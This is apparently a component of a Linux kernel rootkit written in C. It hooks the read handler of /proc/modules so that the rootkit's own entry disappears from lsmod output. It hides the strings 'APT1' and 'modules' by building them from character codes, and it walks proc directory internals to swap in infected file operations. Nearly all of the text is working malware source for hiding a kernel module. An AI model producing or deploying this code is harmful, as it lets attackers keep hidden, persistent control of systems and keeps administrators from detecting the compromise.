#include "lsmod.h"

struct file_operations apt1_proc_fops = { .owner = THIS_MODULE };
struct file_operations fake_fops;
struct file_operations *modules_proc_original;
struct file_operations *proc_original;
struct proc_dir_entry *currDir;
struct proc_dir_entry *modules;
struct proc_dir_entry *new_proc;
char boombox[10];


ssize_t infectedRead (struct file *file, char __user *userbuf, size_t bytes, loff_t *off){
  ssize_t result;
  char *firstOccOfBlunden;
  char *nextNewLine;

  //Err check and return what we would have uninfected
  result = modules_proc_original->read(file, userbuf, bytes, off);

  //See if and where Reverend Bill Blunden is present
  firstOccOfBlunden = strstr(userbuf, TIKTOOR);

  //If IOC is present then hide it
  if(firstOccOfBlunden!=NULL){

    //Get the next new line after blunden cause "blunden 41110 0 - Live 0x00000000\n"
    nextNewLine = strchr(firstOccOfBlunden, '\n');

    //Move the rest of the string on top of the first occurence of blunden
    memmove(firstOccOfBlunden, nextNewLine + 1, result - (nextNewLine+1 - firstOccOfBlunden));

    return result - (nextNewLine+1 - firstOccOfBlunden);

  }
  return result;
}


int init_lsmod_hook(void){
    boombox[0]=(char)65;
    boombox[1]=(char)80;
    boombox[2]=(char)84; 
    boombox[3]=(char)49;
    boombox[4]=(char)0;

    //currDir = /proc/apt1
    currDir = proc_create_data(boombox, 511, 0, &apt1_proc_fops, NULL);

    //currDir = /proc
    currDir = currDir->parent;

    //currDir = /proc/something
    currDir = currDir->subdir;

    boombox[0]=(char)109;
    boombox[1]=(char)111;
    boombox[2]=(char)100; 
    boombox[3]=(char)117;
    boombox[4]=(char)108;
    boombox[5]=(char)101;
    boombox[6]=(char)115;
    boombox[7]=(char)0;
    //currDir = /proc/modules
    while(strcmp(currDir->name, boombox) && currDir!=NULL)
        currDir = currDir->next;

    if(currDir!=NULL){
        //Save uninfected file_operations
        modules_proc_original = (struct file_operations*)currDir->proc_fops;

        //Fake file operations = real file operations (but not for long)
        fake_fops = *currDir->proc_fops;

        //Replace uninfected read with infected read
        fake_fops.read = infectedRead;

        //Put infected version in
        currDir->proc_fops = &fake_fops;
    }
    
    boombox[0]=(char)65;
    boombox[1]=(char)80;
    boombox[2]=(char)84; 
    boombox[3]=(char)49;
    boombox[4]=(char)0; 
    //0 means no parent
    remove_proc_entry(boombox, 0);
    return 0;
}


void exit_lsmod_hook(void){
    modules->proc_fops = modules_proc_original;
}
